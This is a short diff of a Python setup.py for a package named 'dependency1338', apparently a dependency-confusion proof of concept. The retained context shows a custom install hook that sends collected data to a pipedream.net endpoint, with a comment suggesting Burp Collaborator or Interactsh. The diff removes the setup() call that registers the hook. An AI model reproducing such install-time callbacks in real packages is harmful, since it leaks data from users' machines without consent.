@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='dependency1338', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                  
